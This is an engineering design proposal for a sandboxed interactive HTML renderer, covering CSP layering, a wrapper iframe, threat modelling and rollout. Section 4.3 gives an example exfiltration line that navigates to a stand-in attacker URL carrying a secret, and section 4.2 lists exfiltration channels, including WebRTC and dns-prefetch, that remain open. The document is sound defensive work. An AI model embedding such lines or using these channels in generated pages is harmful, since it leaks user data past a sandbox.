# Canvas Slice 1.5 — Interactive HTML Renderer

**Status:** PROPOSED (2026-07-17, revised after 6-agent codebase+web research pass)
**Parent:** `docs/features/dynamic_canvas.md` (authority for Canvas architecture;
this doc adds one renderer mode and changes nothing about pointers, storage, or
the gateway).
**Scope:** one self-contained interactive HTML file, rendered client-side in the
cockpit with scripts running under an isolate-not-sanitize trust model. No
workspace, no gateway, no edge DNS required — works in lite sessions.

---

## 1. Problem

The Slice-1 file stage renders HTML through a sanitize-everything pipeline
(`cockpit/src/app/views/canvas/canvas-rendering.ts:501`, `renderCanvasStaticHtml`):
DOMPurify with `script`, `style`, `button`, `form`, `input`, `iframe`, `link`,
`svg` in `FORBID_TAGS`, every `src` stripped, `href` kept only for same-document
`#anchors`, only size-capped inline `style="…"` surviving. Correct for untrusted
documents, but it means the file stage cannot show the single most common
"agent built something visual" artifact: a self-contained interactive HTML page
(mockup, widget, small game, d3/chart visualization).

Observed failure (dev session `b1758f38`, 2026-07-17): an agent presented a
tabbed mockup showcase via `set_canvas`; the user saw three lines of bare text —
tab labels with the tab script stripped and a dead link. The tool call returned
success, so the agent announced an "interactive mockup showcase" it never had.
Two compounding gaps:

1. **No interactive tier below the live-app viewer.** The design position is
   binary today: "a strict static HTML file is self-contained and script-free;
   anything needing JavaScript … is a gated one-port `workspace_port`." But
   `workspace_port` needs a real workspace, the canvas gateway, and the wildcard
   edge. A lite (virtual/none) session has none of those — and lite sessions are
   exactly where a zero-infrastructure visual stage matters most.
2. **The constraints are invisible to the model.** They live only in
   `config/skills/present-with-canvas/SKILL.md`, which is a menu entry the LLM
   sees by name+description only (loaded on demand via `use_skill`), and the
   silent strip returns success — the agent cannot self-correct.

## 2. Proposal

Add an **explicitly requested** renderer mode, `html-interactive`, that renders a
self-contained HTML file with scripts and styles intact — using **isolation
instead of sanitization** as the defense. This is the claude.ai-Artifacts trust
model: a `sandbox="allow-scripts"` iframe *without* `allow-same-origin`, so the
document runs on an opaque origin (no cookies, no storage, no parent DOM, no
cockpit credentials), under an injected CSP that blocks all network egress.

Strict static HTML (`html`) stays the default and the only value `auto` resolves
to. `html-interactive` is opt-in by the agent, per presentation. The mode covers
**one file, everything inlined** — multi-file sites, backends, networked apps,
and live dev servers remain `workspace_port` (Slice 3) / `workspace_app`
(Slice 4).

The research pass changed one thing materially versus the first draft: an
adversarial security review found that a single sandboxed srcdoc iframe has **two
exfiltration channels no in-document CSP can close** — frame self-navigation and
WebRTC. Self-navigation is closed by construction with a **wrapper (double)
iframe** (§4.3); WebRTC is an accepted, documented residual (§4.4). This is why
the renderer is not "just add `allow-scripts` to the existing component."

## 3. The three CSPs (read this first — they are easy to confuse)

There are three distinct Content-Security-Policies in this design, at three
layers. Confusing them is a security bug.

| # | CSP | Where | Purpose | Posture |
|---|-----|-------|---------|---------|
| 1 | **API-origin raw-byte CSP** | server, `orchestrator/routers/canvases.py:859-864` (existing) | governs a direct browser navigation to the content URL | **Maximally locked, unchanged**: `sandbox` + `script-src 'none'`. Applies to `html` **and** `html-interactive`. Raw bytes never execute on the API origin. |
| 2 | **Inner-frame meta CSP** | cockpit, injected into the untrusted document (new) | governs the agent's running page | **Permissive-but-airgapped**: `script-src 'unsafe-inline'`, `connect-src 'none'`, `data:`-only assets. This is the only place the agent's JS runs. |
| 3 | **Outer-frame meta CSP** | cockpit, wrapper shell (new, §4.3) | blocks the inner frame's self-navigation | **Minimal**: `frame-src 'none'; child-src 'none'`. |
| (4) | **Cockpit page CSP** | cockpit document (Slice C, defense-in-depth) | whole-app hardening + CSRF closure | Independent; see §7. |

The load-bearing invariant: **never relax CSP #1**. Serving `html-interactive`
raw bytes as anything but `attachment` under the locked `sandbox` CSP would let a
victim who opens the content URL directly execute agent script on the API origin.

## 4. Threat model & security design

### 4.1 Trust model

The content is **untrusted** (agent-authored, potentially steered by ingested
content). Defense is **isolation, not sanitization** — DOMPurify is *not* run
for this mode, because sanitizing JavaScript is meaningless. The boundary is the
opaque-origin sandbox + injected CSP + wrapper. This is the same model claude.ai
Artifacts, CodePen (`cdpn.io`), and MDN Playground rely on.

### 4.2 Channel-by-channel containment

From the adversarial review (sources in §11). "Inner CSP" = #2 above.

| Channel | Verdict | Closed by |
|---|---|---|
| `fetch` / XHR / WebSocket / `EventSource` (SSE) / `sendBeacon` / `fetch(keepalive)` / WebTransport | **BLOCKED** | inner CSP `connect-src 'none'` (+ `default-src 'none'`) |
| External `<script>` / `<img>` / `<link>` / `@font-face` / CSS `url()` | **BLOCKED** | inner CSP `default-src 'none'`, `img-src data:`, `font-src data:` |
| `<form>` submission | **BLOCKED (×2)** | inner CSP `form-action 'none'` + sandbox lacks `allow-forms` |
| `window.open(url)` popup exfil | **BLOCKED** | sandbox lacks `allow-popups` |
| Top-frame navigation / phishing | **BLOCKED** | sandbox lacks `allow-top-navigation*` |
| Service / Shared Workers | **BLOCKED (×2)** | opaque origin ⇒ `active service worker = null`; `child-src 'none'` |
| Speculation Rules prefetch/prerender | **BLOCKED** | governed by `default-src 'none'` |
| `<a ping>` | **BLOCKED** | `connect-src 'none'` |
| CSS-selector exfil | **BLOCKED** | needs an external `url()`; none allowed (and moot — the page's own JS already sees its DOM) |
| **Frame self-navigation** (`location.href=…`, `<meta refresh>`) | **OPEN in a single frame → CLOSED by wrapper** | §4.3 — the embedding frame's `frame-src`, not the document's own. `navigate-to` was removed from CSP3 and never shipped, so no in-document directive reaches it. |
| **WebRTC** (`RTCDataChannel` / ICE to attacker STUN/TURN) | **OPEN — accepted residual** | §4.4 — `connect-src` does not cover WebRTC (DTLS/UDP); the CSP `webrtc` directive is Chrome-experimental only. |
| `<link rel=dns-prefetch/preconnect>` hostname exfil | **NEEDS-VERIFY** | should fall under `default-src 'none'`, but historically inconsistent; verify empirically per §9 before multi-tenant exposure. Low bandwidth. |
| `postMessage` to parent | **FEATURE / residual** | intended channel for the deferred console-capture (Slice E); hardened per §4.5. Core slices don't use it. |

### 4.3 Closing self-navigation: the wrapper (double) iframe

A sandboxed document can always navigate **its own** browsing context
(`location.href = 'https://attacker/?d='+secret`, or a script-free
`<meta http-equiv="refresh">`). No sandbox flag removes this and no in-document
CSP directive governs it — the only control is the **embedding document's**
`frame-src`. Two ways to supply one:

- **(A) Wrapper iframe (chosen for Slice B).** The cockpit renders an *outer*
  iframe whose document is a tiny cockpit-authored shell carrying meta CSP #3
  (`frame-src 'none'; child-src 'none'`). The untrusted content goes in an
  *inner* iframe (`sandbox="allow-scripts"`) nested inside that shell. The outer
  shell is now the *embedder* of the inner frame, so the inner frame's
  self-navigation to any `http(s)` URL is a child-navigable navigation checked
  against the outer `frame-src 'none'` → **blocked**. Crucially, a `srcdoc`
  frame's *initial* render is exempt from `frame-src`, so the inner content still
  renders; only its subsequent navigations are caught. This is the same
  double-iframe pattern ChatGPT Apps uses. It is **secure by construction and
  independent of the cockpit page CSP** — the mode is safe to ship before
  Slice C.
- **(B) Cockpit page-level `frame-src` (Slice C).** A whole-page CSP with
  `frame-src 'self'` also governs a single srcdoc frame's self-navigation. This
  is real defense-in-depth and closes an additional same-site GET-CSRF facet
  (§7), but it is more invasive and, header-delivered, has an ngsw lag (§7). We
  do **both**: A is the primary in-renderer defense; B is app-wide hardening.

Implementation note: the wrapper nests one srcdoc inside another, so the inner
document is HTML-attribute-escaped into the outer `srcdoc`. Build the outer shell
by DOM construction, not string concatenation, to get the escaping right. If the
inner payload is delivered as a `blob:` URL instead of srcdoc (§5.3), the outer
CSP becomes `frame-src blob:`.

### 4.4 Accepted residual risks (document, don't pretend to close)

1. **No per-site process isolation (Spectre-class).** Every comparable product
   (claude.ai `claudeusercontent.com`, Google `*.usercontent.goog` on the PSL,
   CodePen `cdpn.io`) uses a *sacrificial registrable domain* so each artifact is
   its own *site* and gets its own renderer process. An opaque-origin srcdoc
   frame is isolated for cookies/storage/DOM but **shares the parent's renderer
   process**, so the residual is Spectre-class cross-frame memory disclosure.
   For no-network, non-shareable, agent-generated content this is a defensible
   trade — and it is the *same* residual claude.ai Artifacts accepts. The upgrade
   path, if ever needed, is to serve the frame from the canvas gateway's
   sacrificial origin (the machinery already exists for the live viewer).
2. **WebRTC egress.** No robust web-platform block exists on default browsers
   (§4.2). Add `webrtc 'block'` to inner CSP #2 (helps only Chrome-with-flag) and
   accept the residual. Browser-level mitigation (`WebRtcIPHandling` enterprise
   policy) is out of scope for arbitrary users.
3. **Sandbox-escape bug tail.** `allow-scripts`-without-`allow-same-origin` has a
   thin but recurring escape history (CVE-2017-7788 srcdoc+sandbox on Firefox;
   CVE-2021-23957 Android `intent://`; a Chrome-Android UXSS), skewed to mobile
   and URL-scheme handlers. Mitigation: keep the sandbox un-relaxed and rely on
   browser patching — the same bet Artifacts makes.

### 4.5 What this design *gains* over the industry norm

Because there is **no hosted preview URL**, the mode is immune to the abuse class
that hit every sacrificial-domain product: hosted AI-preview URLs became phishing
and malware distribution channels (CodeSandbox deleted 240k phishing sandboxes;
v0.dev, Replit, and claude.ai artifact links are all documented phishing vectors).
srcdoc-in-app with no shareable URL removes that entire class. State this
explicitly — it is a real advantage, not just a limitation we're rationalizing.

The corollary is a hard gate: **any future "open in new tab" / "share" / "pop
out" feature for this renderer re-introduces a URL and must be built on the
sacrificial gateway origin, not srcdoc.** (The existing canvas pop-out at
`canvas-pane.component.ts` re-hosts the pane in a `window.open`ed cockpit page —
confirm it does not expose the interactive frame on a bare URL; gate pop-out on
the origin work.)

## 5. Design (code-level)

### 5.1 Server plumbing (Slice A)

The renderer column is `VARCHAR(32)` with no CHECK constraint
(`migrations/app/0058_canvases.sql:17`; the `ck_canvases_source_shape` check only
references `renderer='auto'` in the cleared arm) — **no migration needed** for a
16-char value.

| Change | Anchor | Note |
|---|---|---|
| Extend shared Literal | `orchestrator/services/canvas.py:51` | `+ "html-interactive"`. `CanvasSetRequest.renderer` (`canvases.py:96`) and `CanvasPublicState.renderer` (`canvas.py:194`) reuse it — no separate edit. |
| Accept in compatibility gate | `orchestrator/services/canvas_files.py:480` | `compatible["html"]` is `{"html","text"}` → add `"html-interactive"`, else `422 mime_renderer_mismatch`. **This is the hard blocker a naive enum add hits.** |
| Extend two `ValidatedCanvasFile` Literals | `canvas_files.py:250` and `:415` | both `Literal["markdown","text","html","image"]`; without the value line `:490`'s assignment is type-inconsistent. |
| Never-auto | `canvas_files.py:483-490` (`auto` skips the block; detected HTML renderer is always `"html"` at `:455`) | already satisfied by construction — only add it as a *requested* value, never to detection. |
| **Content-serve: `attachment` disposition** | `canvases.py:844` | `== "html"` → set membership `in {"html","html-interactive"}`. Otherwise interactive raw bytes serve **inline on the API origin**. |
| **Content-serve: locked API-origin CSP #1** | `canvases.py:859` | same `== "html"` → set membership. `html-interactive` gets the **same maximally-locked `sandbox` CSP** (no scripts) — raw bytes are never the interactive surface. |
| Editable parity — **five** gates | `canvas.py:152`, `canvas.py:819`, `canvas_files.py:1122`, `canvas_files.py:1153`, `routers/canvases.py:1367` | all `{"markdown","text","html"}`; the doc's first draft named only two. Miss any of the three service-layer gates and editing silently 4xxs. |
| media_type | stays `text/html` (only `"text"` re-sets it, `canvas_files.py:491`) | correct; no size-cap change (`.html`/`.htm` already map to the text ceiling). |

Endpoint auth manifest: **no regen** — `scripts/check_endpoint_auth.py` keys on
path/method/gate only; no endpoint or gate changes here.

### 5.2 Advisory (Slice D, server half)

The set-time advisory ("this file has `<script>`; it will be stripped under
`html`, use `html-interactive`") must **not** be a `CanvasPublicState` field — that
model's payload is hashed into the state ETag (`canvas.py:478-486`), so a
call-specific string would pollute state identity. Emit it as a **sibling
top-level key** in the set response JSON, computed in the router where the
validated bytes exist (`file.data` at `canvases.py:~1360`, scan for `<script`/
`<link`). The client `set_thread_canvas` returns the body dict (headers are
discarded, `orchestrator_client.py:670-680`), so a body key survives; a response
*header* would not.

### 5.3 Cockpit renderer (Slice B)

New `renderCanvasInteractiveHtml()` in `canvas-rendering.ts` +
`CanvasInteractiveHtmlRendererComponent` beside the strict one
(`canvas-renderers.component.ts:137`).

**Rendering:**
- **No DOMPurify.** Keep the 4 MiB source cap (`CANVAS_RENDER_MAX_OUTPUT_CHARS`);
  drop the node/style budgets (they exist to bound the sanitizer this mode skips).
- **Inner document — CSP #2 injected as the provable first `<head>` child.** A
  meta CSP only governs content *after* it, and the browser preload scanner
  fetches resources declared before it — so parse the source with `DOMParser`
  (inert; scripts don't execute on parse), ensure `<head>` exists, insert the CSP
  meta + `<meta name="referrer" content="no-referrer">` as the first children,
  reserialize. String-prepending is unsafe against agent output that ships its
  own `<head>`.
  ```
  default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';
  img-src data:; font-src data:; media-src data:; connect-src 'none';
  form-action 'none'; base-uri 'none'; object-src 'none'; child-src 'none';
  frame-src 'none'; webrtc 'block';
  ```
- **Wrapper (§4.3):** the component's iframe is the *outer* shell (cockpit-authored,
  carrying CSP #3 `default-src 'none'; frame-src 'none'; child-src 'none'`); the
  inner iframe holds the injected untrusted document with:
  ```html
  <iframe sandbox="allow-scripts" loading="lazy" referrerpolicy="no-referrer"
          allow="camera 'none'; microphone 'none'; geolocation 'none';
                 clipboard-read 'none'; clipboard-write 'none'"
          [title]="title()"></iframe>
  ```
  No `allow-same-origin`, `allow-forms`, `allow-popups`, `allow-modals`,
  `allow-downloads`, `allow-top-navigation*`. Enforce "never `allow-same-origin`"
  as a reviewed invariant (with it, the frame deletes its own `sandbox`).

**Payload delivery:** srcdoc for the inner content up to ~1–2 MiB; above that,
switch to a `blob:` URL (`URL.createObjectURL`, `sandbox` still forces the opaque
origin, `revokeObjectURL` on teardown, and the outer CSP becomes `frame-src
blob:`). srcdoc has no hard size cap but multi-MB attributes are perf-bound
(observed `RangeError` in the wild near the top of our 4 MiB range). data: URLs
are *not* used for the document itself (browser-specific length limits).

**Resource-abuse lifecycle:** timer throttling does not stop a `while(true)` busy
loop or a memory bomb. **Detach the iframe from the DOM when the canvas panel is
hidden** (not `display:none`) and cap payload size. A `postMessage` liveness
watchdog is a Slice-E add-on.

**Wiring (every consumer of the renderer enum):**

| Site | Anchor |
|---|---|
| Wire enum union | `cockpit/src/app/core/models/canvas.model.ts:47` |
| **Runtime allowlist (silent-drop gotcha)** | `canvas.service.ts:523` (`CANVAS_RENDERERS` set) + guard `:547` — an unknown renderer fails `isCanvasState`, so the **whole** canvas state is dropped, not just the renderer. Must be updated or nothing renders. |
| Trusted enum + mapping switch | `canvas-rendering.ts:8-14`, `selectCanvasRenderer` switch `:173-181` (keep in lockstep with the spec `it.each`) |
| Pane `@switch` `@case` + imports + scss | `canvas-pane.component.ts:260-282`, imports `:85-92`, `canvas-pane.component.scss:244-247` |
| Header chip label | `rendererLabel` `canvas-pane.component.ts:383-384` (raw renderer string → i18n key) |
| Editable gates (two, duplicated) | `canvas-edit.controller.ts:345` and `:552`; snapshot type `:28` auto-widens |
| i18n label keys | `canvas.renderer.html-interactive` in **both** `assets/i18n/en.json:95-102` and `de-DE.json:95-102` (hyphenated key literal); decide reuse vs new `canvas.html.frameTitle` `:121-122` |

Content fetch (`canvas-content.controller.ts:49-129`) needs no change — the
`visualKey = "${sourceKey}:${renderer}"` (`:64`) gives the new renderer its own
cache slot automatically; no per-path size cap exists outside the render function.

### 5.4 Agent guidance (Slice D, agent half)

Correction to the first draft: `CANVAS_TOOLS_METADATA["set_canvas"]["description"]`
(`src/tools/canvas/__init__.py:51`) is **not** LLM-visible — it feeds workspace
docs only. Two surfaces actually reach the model:

1. **Renderer `Field(description=…)` — primary, deferral-proof.** The `Literal`
   values + their Field text become the args JSON schema. Put the constraint here,
   on **both** `_SetFileCanvasArguments.renderer` (`:99-102`) and
   `_SetLiveCanvasArguments.renderer` (`:150-153`) (and the inline signature
   `Literal` at `:335`). Field descriptions survive tool deferral; docstrings do
   not (`description_manager.py` swaps to `short_description` when
   `defer_to_workspace=True` — canvas isn't deferred today, but Field text is the
   robust home). `_SetLiveCanvasArguments`'s validator forces `auto` for
   `workspace_port`, so `html-interactive` is only ever valid for `workspace_file`.
2. **`@tool` docstring at `:342`** — secondary; add one constraint sentence, e.g.
   *"`html` strips scripts/styles/forms; `html-interactive` runs inline scripts in
   a locked sandbox with no network — inline everything, reference no external or
   sibling files."*

Also: extend the tool-result allowlist `_LOGICAL_STATE_FIELDS`
(`src/tools/canvas/__init__.py:22-32`) with an `advisory` key, or the server
advisory (§5.2) is silently dropped by `_logical_canvas_state` (`:245-283`). No
prior dict-field advisory exists — this is a new (small) convention; every
existing precedent appends to string results.

**Skill** (`config/skills/present-with-canvas/SKILL.md`): the LLM sees only the
front-matter `description:` (`:3`) until it runs `use_skill`. Put the three-tier
rule in the body (`:37-45`: strict static → `html-interactive` → `workspace_port`)
**and** telegraph it in the one-line description so an agent that never opens the
skill still gets the hint.

## 6. Implementation slices

- **A — server plumbing.** Enum, `compatible` map, two `ValidatedCanvasFile`
  Literals, disposition + API-CSP set-membership (both `canvases.py:844` and
  `:859`), five editable gates, tool schema Literals + Field descriptions.
  Tests in `tests/test_canvas_slice1_backend.py` (accept/reject + never-auto,
  mirror `:157-205`) and `tests/test_canvas_tool.py` (schema).
- **B — cockpit renderer.** `renderCanvasInteractiveHtml()` (DOMParser CSP
  injection, wrapper shell, 4 MiB cap) + `CanvasInteractiveHtmlRendererComponent`
  + the full wiring table (§5.3, incl. the `CANVAS_RENDERERS` allowlist) + i18n.
  Specs mirror `canvas-live-app-renderer.spec.ts:48-65` (exact `sandbox`
  attribute assertion; no `allow-same-origin`) and `canvas-rendering.spec.ts`
  (CSP is first head child; scripts survive; 4 MiB rejection; wrapper blocks a
  synthetic child navigation). **Secure by construction — does not depend on C.**
- **C — cockpit page-level CSP (defense-in-depth).** Full `Content-Security-Policy`
  on the cockpit document; carries a `frame-src` allowlist (`'self'` +
  `https://*<canvasViewerHostSuffix>`, helm-templated, omitted when the viewer is
  dark). Closes the same-site GET-CSRF facet and hardens the postMessage sink;
  also benefits the live viewer. Deliver as a **`<meta http-equiv>` in
  `index.html`** (survives the ngsw document cache — the `srw-app-shell-policy`
  marker at `index.html:6-7` already anticipates this) rather than a header-only
  policy that the service worker can replay stale. Draft directive list and the
  full iframe inventory are in §7. Independently shippable.
- **D — guidance.** Field descriptions (primary) + docstring + skill front-matter
  & body + server set-time advisory + tool-result allowlist key.
- **E — console/error capture (deferred enhancement).** Inject a bootstrap that
  hooks `console.*`, `window.onerror`, `unhandledrejection` and posts structured
  events out; surface runtime errors to the user/agent. With an opaque origin
  `event.origin` is `"null"`, so authenticate the channel by a `MessageChannel`
  port handed in at load (port-as-capability) or `event.source ===
  frame.contentWindow`, **never** by origin string; schema-validate every message
  and route it to no HTML/DOM/`eval` sink. Adds the liveness watchdog.

A + B + D deliver a usable, **self-contained-secure** feature (self-navigation
closed by B's wrapper, network closed by CSP #2). C is app-wide hardening; E is
UX polish.

## 7. Rollout & compatibility (both directions break)

`html-interactive` must ship **cockpit and orchestrator together**:

- **Old cockpit, new orchestrator:** an unknown renderer fails
  `CANVAS_RENDERERS.has()` in `isCanvasState` (`canvas.service.ts:547`) → the
  entire canvas state is treated invalid and dropped (not a soft "unsupported"
  fallback). Blank pane.
- **Old orchestrator, new cockpit (mixed-version orchestrator replicas):**
  `CanvasRecord.from_row` (`canvas.py:247`) accepts any stored string
  (dataclass, no validation), but serializing it through the pydantic
  `CanvasPublicState.renderer` Literal (`canvas.py:194`) raises `ValidationError`
  → **500 on every state GET** for that row. So a new row written by one replica
  breaks reads on an old replica.

Sequence: deploy orchestrator + cockpit in one rollout; there is no partial-safe
ordering. (The event path is renderer-agnostic — `_emit_canvas_event` only
carries `canvas.updated/cleared` with no renderer field — so live invalidation is
unaffected; the risk is purely the state GET + the read-time guards above.)

**Slice C CSP context (from the iframe inventory):** the cockpit frames exactly
two things — the live-app viewer (`canvas-live-app-renderer.component.ts:23-29`,
cross-origin gateway) and the srcdoc renderers (`canvas-renderers.component.ts:146`).
Everything else (IDE/code-server, OpenCloud, Gitea, Dozzle, pop-out) is
`window.open` **new tabs**, not frames, and **there is no Keycloak silent-SSO
iframe** (auth is a full top-level BFF redirect). So `frame-src` needs only
`'self'` (for the srcdoc frames — omitting `'self'` blanks both HTML renderers)
plus the templated gateway wildcard. Current headers are just `frame-ancestors
'none'; img-src 'self' blob: data:` at `docker/cockpit-nginx.conf:9` (baked into
the image, not templated). Draft directive list (helm-substitute the origins;
drop each external allowance when its feature is same-origin/disabled so the
policy fails closed):

```
default-src 'self';
script-src 'self' 'unsafe-inline';                 # two inline index.html blocks (:42-64,:67-86) + env.js
style-src  'self' 'unsafe-inline' https://fonts.googleapis.com;
font-src   'self' https://fonts.gstatic.com data:;
img-src    'self' blob: data:;                     # canvas/proxied images are blob:
media-src  'self' blob:;                            # TTS/read-aloud audio
connect-src 'self' https://api.<domain> wss://api.<domain>;  # XHR/SSE + control WS (sessionRouter.ingressHost); collapse when bff.sameOriginApi
frame-src  'self' https://*<canvasViewerHostSuffix>;         # srcdoc renderers + live-app viewer (omit wildcard when dark)
worker-src 'self' blob:;                            # Monaco AMD/blob workers
form-action 'self' https://<authHost>;              # BFF /auth/login redirect
base-uri 'self'; object-src 'none'; frame-ancestors 'none';
```

Templating options already in the repo: a traefik Middleware with
`customResponseHeaders` (the pattern used for the OpenCloud CSP,
`helm/templates/services/opencloud.yaml:45-47`), a templated nginx-conf mount, or
the `docker/cockpit-canvas-env.sh` sed hook. Prefer the `index.html` meta for
ngsw-safety, values-driven via the same `srw.*Url` helpers that already build
`env.js`.

## 8. Acceptance criteria

1. Agent presents a single-file HTML page with inline `<style>`, `<script>`, and
   a `data:` image via `set_canvas(renderer="html-interactive")`; the cockpit
   shows it styled and the script-driven interaction (e.g. tabs) works.
2. The same file via `renderer="html"` renders text-only (strict mode unchanged),
   and the tool result carries the §5.2 advisory.
3. `renderer="auto"` never yields `html-interactive` for any input.
4. Inside the frame: `fetch()`/XHR/WebSocket to any external host reject (CSP);
   `document.cookie` is empty (opaque origin); `window.parent`/`window.top` DOM
   access throws (cross-origin sandbox); `window.open` returns null; form submit
   blocked.
5. **Self-navigation blocked:** `location.href="https://example.com"` and a
   `<meta http-equiv="refresh">` from inside the frame do **not** produce an
   outbound request (wrapper `frame-src 'none'`), verified in a browser network
   trace.
6. `editable=true` works with source-text (Monaco) editing exactly as strict
   `html`.
7. A lite (virtual) session — no workspace pod, no gateway — presents an
   interactive page end-to-end.
8. WebRTC exfil is documented as accepted residual; `webrtc 'block'` present in
   the inner CSP. dns-prefetch/preconnect verified empirically (§9) before
   any multi-tenant exposure.
9. Coordinated rollout verified: no orchestrator replica 500s and no cockpit
   blank-pane during a mixed-version window (or the rollout is gated atomic).

## 9. Open questions

- **dns-prefetch/preconnect:** confirm `default-src 'none'` actually blocks
  `<link rel=dns-prefetch|preconnect>` hostname exfil on current Chrome/Firefox/
  Safari. Treat OPEN until proven. (Low bandwidth; not a launch blocker for the
  single-user posture, is one for multi-tenant.)
- **Wrapper vs single-frame:** is the double-iframe complexity worth shipping in
  B, or do we accept self-nav open until Slice C's page `frame-src` lands and ship
  a single frame first? (Recommendation: wrapper — it makes B self-contained and
  the mode safe on the current single-user dev posture without waiting on C.)
- **Shared isolated-document helper:** the pre-launch markdown-iframe hardening
  (parent doc item 3) wants the same DOMParser-inject + sandboxed-srcdoc shell —
  build one `renderIsolatedDocument()` helper both consume?
- **data: asset budget:** cap `data:` asset count/size separately from the 4 MiB
  source cap? (Lean: source cap suffices.)
- **Naming:** `html-interactive` (chosen; sorts beside `html`) vs
  `interactive_html`.

## 10. Industry alignment (why these choices)

- **No-network matches the strictest current practice** — it is exactly Claude
  Code's own artifacts model (block all external requests, inline everything,
  data: assets). claude.ai's older cdnjs-only allowlist is the legacy compromise
  and is leaky (documented cdnjs path-traversal CSP bypass; package CDNs serve
  attacker-publishable content). "None" is strictly simpler and stronger. If
  library support is ever wanted, inline at publish time — never allowlist a CDN
  at render time.
- **Opaque-origin srcdoc instead of a sacrificial domain** is our one divergence
  from unanimous practice; §4.4 records the Spectre trade and §4.5 the
  abuse-immunity gain.
- **In-frame interceptor + postMessage** is the uniform console-capture pattern
  (Sandpack, claude.ai viewer, CodePen, MDN) — Slice E ports it directly.

## 11. References

Design decisions above are grounded in:
- CSP3 & `navigate-to` removal (self-nav is uncloseable in-document):
  w3c/webappsec-csp#608; MDN `frame-src`, `connect-src`, `sandbox` directives.
- srcdoc inherits parent CSP; child cannot escape (wontfix): w3c/webappsec-csp#700;
  meta-CSP ignores `frame-ancestors`/`sandbox`/`report-uri`: OWASP CSP cheat sheet.
- WebRTC ∉ connect-src (real skimmer): Sansec WebRTC skimmer; `webrtc` directive
  Chrome-experimental / Firefox-unimplemented: chromium 40188662, bugzilla 1783489.
- dns-prefetch exfil: Compass Security 2016; `prefetch-src` deprecation: MDN.
- Sandbox-escape tail: CVE-2017-7788 (srcdoc+sandbox), CVE-2021-23957 (Android).
- Artifacts model (process isolation, cdnjs-only, postMessage/console capture):
  Anthropic-via-Simon-Willison writeup; Claude Code artifacts full-no-network CSP
  (code.claude.com/docs artifacts). ChatGPT double-iframe: dev.to reverse-eng.
  Google SafeContentFrame (PSL per-artifact origins): Google Bug Hunters.
- Hosted-URL abuse class we avoid: CodeSandbox phishing (240k deleted); Okta on
  v0.dev phishing; Val Town cookie-inheritance → val.run.
- srcdoc size / blob origin trap: ampproject/amphtml#10495; MDN srcdoc.

(Full URL set in the research transcript; the above are the load-bearing ones.)
